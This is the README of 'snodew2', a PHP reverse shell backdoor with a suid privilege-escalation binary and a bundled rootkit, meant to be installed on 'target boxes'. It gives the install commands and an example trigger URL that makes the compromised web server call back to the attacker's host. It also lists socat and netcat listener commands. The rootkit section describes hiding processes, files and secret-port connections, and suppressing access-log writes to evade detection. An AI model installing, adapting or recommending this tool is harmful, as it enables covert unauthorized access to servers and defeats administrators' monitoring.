
# snodew2
 * PHP reverse shell backdoor which uses a small suid binary to escalate privileges on connection.
 * new iteration of [snodew](https://github.com/mempodippy/snodew) but better.
 * snodew was previously designed to work alongside [vlany](https://github.com/mempodippy/vlany).
   * this is no longer the case as this version comes with its own specialised rootkit.
   * if you don't wish to have rootkit capabilities with snodew2, you can disable installation of the rootkit, so all that is setup is the backdoor itself.
   * but i would have to discourage doing that.
 * when it comes to the backdoor itself, you have 3 possible choices:
   * regular plaintext non-interactive reverse shell.
   * plaintext interactive reverse shell. (socat is required)
   * interactive ssl reverse shell. (socat & ssl is required)

## usage
```
git clone https://github.com/naworkcaj/snodew2.git
cd snodew/
./setup.sh [install dir] [password]
```

### example usage
 * take a look within `setup.sh`. you may want to change the following variables.
   * <b>WWWNAME:</b> to match the target service user's name on the box.
   * <b>SECRET_PORT:</b> to your own port of preference. if you don't; a random number will be used.
   * <b>SNODEW_LOC:</b> somewhat self-explanatory.
     * `snodew.ncat.php` is the original script that came with snodew.
     * `snodew.socat.php` spawn and send the reverse shell to your listener as a psuedo-interactive shell.
     * `snodew.socat.ssl.php` literally the same as above. but with ssl instead of plaintext. (this is the default)
 * if you're sticking with the default, `snodew.socat.ssl.php`, you'll need to use `src/gencert.sh` first on your own box.
   * this will create the necessary files, for `src/listen_socat.sh` on your box & for `setup.sh` to copy & the rootkit too, to hide.
 * after doing `./gencert.sh` (if you're using ssl) & editing your variables to your own preferences, use your own configuration & certificate to install snodew on target boxes.

```
./setup.sh /var/www/html/blog sexlovegod
(or without rootkit capabilities)
NO_ROOTKIT=1 ./setup.sh /var/www/html/blog sexlovegod
```
 * `setup.sh` will show you the name of snodew.php in the location you specified as the installation directory.
 * visit that in your browser. making sure you set your correct password.
   * for example, `http://lol.ok/blog/gjunmf.php?password=sexlovegod`
 * listen for an incoming connection coming from the box you installed snodew on, with an appropriate utility for your setup.
   * `socat file:`tty`,raw,echo=0 tcp-listen:<SECRET_PORT>`
   * `src/listen_socatssl.sh <SECRET_PORT>`
   * `nc -vlp <SECRET_PORT>`
   * `http://lol.ok/blog/gjunmf.php?password=sexlovegod&host=urbox`
   * congrats u have a shell

### examples of successful installation & usage (snodew.socat.ssl.php)
<b>result of successful installation:</b><br>
<img src="https://i.imgur.com/V8tABI9.png">

<b>visiting newly created & hidden php script:</b><br>
<img src="https://i.imgur.com/cY8trpr.png">

<b>getting the reverse shell from the kitted box:</b><br>
<img src="https://i.imgur.com/GLsDxnj.png">

## general notes
 * setup & installation of snodew is free of any significant dependencies.
   * just gcc, an available web service.
   * & `socat` (with ssl support if you desire)
     * not the case if you use `snodew.ncat.php`

## backdoor notes
 * choice of regular plaintext reverse shell, interactive reverse shell powered by socat; or too the latter but using ssl.
   * use of ssl is encouraged. and is the default.
   * see src/snodew.\*.php
 * trying to access snodew.php through a browser without having 'password' set & correct will display a 404 page.
   * NOT THE SERVER'S 404 PAGE. JUST A 404 PAGE.
 * suid executables can potentially be disabled on the box. most likely & usually not.
 * theoretically, snodew.php could be any kind of PHP file. you'd just have to rearrange some stuff.

## rootkit notes
 * all processes spawned for & by the rootkit are hidden.
   * in the original snodew, i had made a note of the fact that the initial spawning of the suid binary was visible in process listings.
     * this is no longer the case.
   * the original version also used extended attributes to hide regular files, i.e, not processes.
     * this too, is no longer the case. we only using a magic GID.

 * when the rootkit is installed, regular users can't see the PHP file, or the suid binary.
   * snodew determines when the service user can see the PHP file & the suid bin...
   * fundamental factors in deciding what makes the service user worthy of being able to see & access the two files are the following:
     * *you may need to change `WWWNAME` in setup.sh*
     * their UID & GID
     * their home directory
     * their environment variables
     * and their process name
 * during installation of the rootkit, you'll be given a magic variable.
   * you'll only need to use this in very special situations, most likely never. you'll know if or when you need to use it.

 * the rootkit's write() hook breaks write when buf contains the php filename.
   * this is in an effort to prevent access logs @ the php file.

## the rootkit does:
 * hide: backdoor connection information from netstat, ss, and all variants.
   * __only for connections on the secret port.__
 * hide: rootkit location from process maps files.
 * hide: obviously, files & processes spawned for or by the rootkit & snodew's backdoor.
 * evades discovery from various tools.
 * running `./killself` in a backdoor shell will remove the backdoor & rootkit from the box.
